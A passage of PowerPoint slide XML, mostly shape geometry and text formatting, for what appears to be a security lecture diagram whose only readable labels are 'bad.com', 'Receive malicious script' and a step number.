              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bad.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164878" name="object 14"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7887541" y="2745441"/>
            <a:ext cx="0" cy="1497386"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T1" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T2" fmla="*/ 0 60000 65536"/>
              <a:gd name="T3" fmla="*/ 0 60000 65536"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="T2">
                <a:pos x="0" y="T0"/>
              </a:cxn>
              <a:cxn ang="T3">
                <a:pos x="0" y="T1"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path h="2130425">
                <a:moveTo>
                  <a:pt x="-38100" y="1065129"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="38100" y="1065129"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="2130259">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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164879" name="object 15"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7783886" y="4216213"/>
            <a:ext cx="207309" cy="214313"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 590 w 304800"/>
              <a:gd name="T1" fmla="*/ 0 h 304800"/>
              <a:gd name="T2" fmla="*/ 0 w 304800"/>
              <a:gd name="T3" fmla="*/ 0 h 304800"/>
              <a:gd name="T4" fmla="*/ 294 w 304800"/>
              <a:gd name="T5" fmla="*/ 1311 h 304800"/>
              <a:gd name="T6" fmla="*/ 590 w 304800"/>
              <a:gd name="T7" fmla="*/ 0 h 3048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04800" h="304800">
                <a:moveTo>
                  <a:pt x="304800" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152400" y="304800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30480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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164880" name="object 16"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8051426" y="2951349"/>
            <a:ext cx="320769" cy="330574"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 796 w 471170"/>
              <a:gd name="T1" fmla="*/ 281 h 471170"/>
              <a:gd name="T2" fmla="*/ 856 w 471170"/>
              <a:gd name="T3" fmla="*/ 433 h 471170"/>
              <a:gd name="T4" fmla="*/ 899 w 471170"/>
              <a:gd name="T5" fmla="*/ 600 h 471170"/>
              <a:gd name="T6" fmla="*/ 924 w 471170"/>
              <a:gd name="T7" fmla="*/ 778 h 471170"/>
              <a:gd name="T8" fmla="*/ 933 w 471170"/>
              <a:gd name="T9" fmla="*/ 961 h 471170"/>
              <a:gd name="T10" fmla="*/ 924 w 471170"/>
              <a:gd name="T11" fmla="*/ 1145 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1322 h 471170"/>
              <a:gd name="T14" fmla="*/ 856 w 471170"/>
              <a:gd name="T15" fmla="*/ 1489 h 471170"/>
              <a:gd name="T16" fmla="*/ 796 w 471170"/>
              <a:gd name="T17" fmla="*/ 1640 h 471170"/>
              <a:gd name="T18" fmla="*/ 723 w 471170"/>
              <a:gd name="T19" fmla="*/ 1764 h 471170"/>
              <a:gd name="T20" fmla="*/ 642 w 471170"/>
              <a:gd name="T21" fmla="*/ 1851 h 471170"/>
              <a:gd name="T22" fmla="*/ 556 w 471170"/>
              <a:gd name="T23" fmla="*/ 1903 h 471170"/>
              <a:gd name="T24" fmla="*/ 466 w 471170"/>
              <a:gd name="T25" fmla="*/ 1921 h 471170"/>
              <a:gd name="T26" fmla="*/ 377 w 471170"/>
              <a:gd name="T27" fmla="*/ 1903 h 471170"/>
              <a:gd name="T28" fmla="*/ 291 w 471170"/>
              <a:gd name="T29" fmla="*/ 1851 h 471170"/>
              <a:gd name="T30" fmla="*/ 210 w 471170"/>
              <a:gd name="T31" fmla="*/ 1764 h 471170"/>
              <a:gd name="T32" fmla="*/ 137 w 471170"/>
              <a:gd name="T33" fmla="*/ 1640 h 471170"/>
              <a:gd name="T34" fmla="*/ 77 w 471170"/>
              <a:gd name="T35" fmla="*/ 1489 h 471170"/>
              <a:gd name="T36" fmla="*/ 34 w 471170"/>
              <a:gd name="T37" fmla="*/ 1322 h 471170"/>
              <a:gd name="T38" fmla="*/ 9 w 471170"/>
              <a:gd name="T39" fmla="*/ 1145 h 471170"/>
              <a:gd name="T40" fmla="*/ 0 w 471170"/>
              <a:gd name="T41" fmla="*/ 961 h 471170"/>
              <a:gd name="T42" fmla="*/ 9 w 471170"/>
              <a:gd name="T43" fmla="*/ 778 h 471170"/>
              <a:gd name="T44" fmla="*/ 34 w 471170"/>
              <a:gd name="T45" fmla="*/ 600 h 471170"/>
              <a:gd name="T46" fmla="*/ 77 w 471170"/>
              <a:gd name="T47" fmla="*/ 433 h 471170"/>
              <a:gd name="T48" fmla="*/ 137 w 471170"/>
              <a:gd name="T49" fmla="*/ 281 h 471170"/>
              <a:gd name="T50" fmla="*/ 210 w 471170"/>
              <a:gd name="T51" fmla="*/ 158 h 471170"/>
              <a:gd name="T52" fmla="*/ 291 w 471170"/>
              <a:gd name="T53" fmla="*/ 70 h 471170"/>
              <a:gd name="T54" fmla="*/ 377 w 471170"/>
              <a:gd name="T55" fmla="*/ 17 h 471170"/>
              <a:gd name="T56" fmla="*/ 466 w 471170"/>
              <a:gd name="T57" fmla="*/ 0 h 471170"/>
              <a:gd name="T58" fmla="*/ 556 w 471170"/>
              <a:gd name="T59" fmla="*/ 17 h 471170"/>
              <a:gd name="T60" fmla="*/ 642 w 471170"/>
              <a:gd name="T61" fmla="*/ 70 h 471170"/>
              <a:gd name="T62" fmla="*/ 723 w 471170"/>
              <a:gd name="T63" fmla="*/ 158 h 471170"/>
              <a:gd name="T64" fmla="*/ 796 w 471170"/>
              <a:gd name="T65" fmla="*/ 281 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="401862" y="68948"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="432027" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470810" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="432027" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="470810"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="68948"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="68948"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164881" name="object 19"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7304835" y="4549588"/>
            <a:ext cx="232522" cy="200306"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 249 w 339725"/>
              <a:gd name="T1" fmla="*/ 0 h 284479"/>
              <a:gd name="T2" fmla="*/ 0 w 339725"/>
              <a:gd name="T3" fmla="*/ 1263 h 284479"/>
              <a:gd name="T4" fmla="*/ 765 w 339725"/>
              <a:gd name="T5" fmla="*/ 1124 h 284479"/>
              <a:gd name="T6" fmla="*/ 249 w 339725"/>
              <a:gd name="T7" fmla="*/ 0 h 28447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39725" h="284479">
                <a:moveTo>
                  <a:pt x="110566" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="284048"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="339318" y="252590"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11056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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164882" name="object 25"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4041122" y="3808600"/>
            <a:ext cx="231121" cy="200305"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 662 w 339725"/>
              <a:gd name="T1" fmla="*/ 0 h 284479"/>
              <a:gd name="T2" fmla="*/ 0 w 339725"/>
              <a:gd name="T3" fmla="*/ 137 h 284479"/>
              <a:gd name="T4" fmla="*/ 445 w 339725"/>
              <a:gd name="T5" fmla="*/ 1262 h 284479"/>
              <a:gd name="T6" fmla="*/ 662 w 339725"/>
              <a:gd name="T7" fmla="*/ 0 h 28447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39725" h="284479">
                <a:moveTo>
                  <a:pt x="339369" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="30962"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="228396" y="283883"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33936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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="object 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1260000">
            <a:off x="4622427" y="4465580"/>
            <a:ext cx="3192276" cy="243656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1918"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" baseline="1915" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Receive </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2030" spc="11" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2030" spc="-72" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3000" spc="52" baseline="-1915" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>script</a:t>
            </a:r>
            <a:endParaRPr sz="3000" baseline="-1915" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164884" name="object 27"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4441733" y="3667125"/>
            <a:ext cx="322169" cy="331975"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 993 w 471170"/>
              <a:gd name="T1" fmla="*/ 643 h 471170"/>
              <a:gd name="T2" fmla="*/ 1024 w 471170"/>
              <a:gd name="T3" fmla="*/ 848 h 471170"/>
              <a:gd name="T4" fmla="*/ 1036 w 471170"/>
              <a:gd name="T5" fmla="*/ 1056 h 471170"/>
              <a:gd name="T6" fmla="*/ 1027 w 471170"/>
              <a:gd name="T7" fmla="*/ 1260 h 471170"/>
              <a:gd name="T8" fmla="*/ 999 w 471170"/>
              <a:gd name="T9" fmla="*/ 1456 h 471170"/>
              <a:gd name="T10" fmla="*/ 954 w 471170"/>
              <a:gd name="T11" fmla="*/ 1638 h 471170"/>
              <a:gd name="T12" fmla="*/ 893 w 471170"/>
              <a:gd name="T13" fmla="*/ 1799 h 471170"/>
              <a:gd name="T14" fmla="*/ 815 w 471170"/>
              <a:gd name="T15" fmla="*/ 1936 h 471170"/>
              <a:gd name="T16" fmla="*/ 723 w 471170"/>
              <a:gd name="T17" fmla="*/ 2040 h 471170"/>
              <a:gd name="T18" fmla="*/ 623 w 471170"/>
              <a:gd name="T19" fmla="*/ 2105 h 471170"/>
              <a:gd name="T20" fmla="*/ 522 w 471170"/>
              <a:gd name="T21" fmla="*/ 2127 h 471170"/>
              <a:gd name="T22" fmla="*/ 422 w 471170"/>
              <a:gd name="T23" fmla="*/ 2109 h 471170"/>
              <a:gd name="T24" fmla="*/ 327 w 471170"/>
              <a:gd name="T25" fmla="*/ 2051 h 471170"/>
              <a:gd name="T26" fmla="*/ 238 w 471170"/>
              <a:gd name="T27" fmla="*/ 1958 h 471170"/>
              <a:gd name="T28" fmla="*/ 160 w 471170"/>
              <a:gd name="T29" fmla="*/ 1831 h 471170"/>
              <a:gd name="T30" fmla="*/ 94 w 471170"/>
              <a:gd name="T31" fmla="*/ 1673 h 471170"/>
              <a:gd name="T32" fmla="*/ 43 w 471170"/>
              <a:gd name="T33" fmla="*/ 1484 h 471170"/>
              <a:gd name="T34" fmla="*/ 11 w 471170"/>
              <a:gd name="T35" fmla="*/ 1279 h 471170"/>
              <a:gd name="T36" fmla="*/ 0 w 471170"/>
              <a:gd name="T37" fmla="*/ 1071 h 471170"/>
              <a:gd name="T38" fmla="*/ 9 w 471170"/>
              <a:gd name="T39" fmla="*/ 866 h 471170"/>
              <a:gd name="T40" fmla="*/ 36 w 471170"/>
              <a:gd name="T41" fmla="*/ 671 h 471170"/>
              <a:gd name="T42" fmla="*/ 82 w 471170"/>
              <a:gd name="T43" fmla="*/ 489 h 471170"/>
              <a:gd name="T44" fmla="*/ 143 w 471170"/>
              <a:gd name="T45" fmla="*/ 327 h 471170"/>
              <a:gd name="T46" fmla="*/ 221 w 471170"/>
              <a:gd name="T47" fmla="*/ 192 h 471170"/>
              <a:gd name="T48" fmla="*/ 313 w 471170"/>
              <a:gd name="T49" fmla="*/ 87 h 471170"/>
              <a:gd name="T50" fmla="*/ 412 w 471170"/>
              <a:gd name="T51" fmla="*/ 22 h 471170"/>
              <a:gd name="T52" fmla="*/ 514 w 471170"/>
              <a:gd name="T53" fmla="*/ 0 h 471170"/>
              <a:gd name="T54" fmla="*/ 614 w 471170"/>
              <a:gd name="T55" fmla="*/ 19 h 471170"/>
              <a:gd name="T56" fmla="*/ 709 w 471170"/>
              <a:gd name="T57" fmla="*/ 75 h 471170"/>
              <a:gd name="T58" fmla="*/ 797 w 471170"/>
              <a:gd name="T59" fmla="*/ 168 h 471170"/>
              <a:gd name="T60" fmla="*/ 876 w 471170"/>
              <a:gd name="T61" fmla="*/ 296 h 471170"/>
              <a:gd name="T62" fmla="*/ 942 w 471170"/>
              <a:gd name="T63" fmla="*/ 454 h 471170"/>
              <a:gd name="T64" fmla="*/ 993 w 471170"/>
              <a:gd name="T65" fmla="*/ 643 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="451630" y="142261"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="466021" y="187720"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470920" y="233728"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466820" y="279041"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="454217" y="322414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="433605" y="362603"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="405478" y="398365"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="370331" y="428456"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="328659" y="451630"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="283199" y="466021"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="237191" y="470920"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="191879" y="466820"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="148505" y="454217"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108316" y="433605"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72554" y="405478"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42464" y="370331"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19289" y="328659"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4898" y="283199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="237191"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4099" y="191879"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16702" y="148506"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37315" y="108316"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65441" y="72554"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100588" y="42464"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142261" y="19289"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="187720" y="4898"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="233728" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="279040" y="4099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322414" y="16702"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="362603" y="37315"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="398365" y="65441"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="428456" y="100588"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="451630" y="142261"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="object 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1260000">
            <a:off x="4483754" y="3740157"/>
            <a:ext cx="358588" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2405"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164886" name="object 29"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8110258" y="5427850"/>
            <a:ext cx="334776" cy="320768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId7"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
